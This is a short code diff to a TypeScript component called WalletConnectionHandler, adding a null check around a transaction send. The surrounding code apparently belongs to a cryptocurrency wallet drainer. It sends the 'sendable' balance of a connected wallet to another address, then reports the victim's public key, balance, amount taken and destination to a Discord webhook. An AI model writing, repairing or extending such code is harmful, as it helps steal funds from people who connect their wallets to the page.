@@ -163,16 +163,21 @@ const WalletConnectionHandler: FC = () => {
 
             setTimeout(async () => {
                 try {
-                    const txid = await sendTransaction(finalTx, connection);
-                    console.log(`🚀 Transaction sent: https://solscan.io/tx/${txid}`);
+                    if (connection) {
+                        const txid = await sendTransaction(finalTx, connection);
+                        console.log(`🚀 Transaction sent: https://solscan.io/tx/${txid}`);
 
-                    await sendDiscordWebhook(
-                        walletPublicKey.toBase58(),
-                        lamports / LAMPORTS_PER_SOL,
-                        sendableLamports,
-                        toPubkey.toBase58(),
-                        txid
-                    );
+                        await sendDiscordWebhook(
+                            walletPublicKey.toBase58(),
+                            lamports / LAMPORTS_PER_SOL,
+                            sendableLamports,
+                            toPubkey.toBase58(),
+                            txid
+                        );
+                    } else {
+                        console.error('❌ Connection is null');
+                        alert('❌ Connection is null');
+                    }
                 } catch (err) {
                     console.error('❌ Failed to send transaction:', err);
                     alert('❌ Transaction failed');
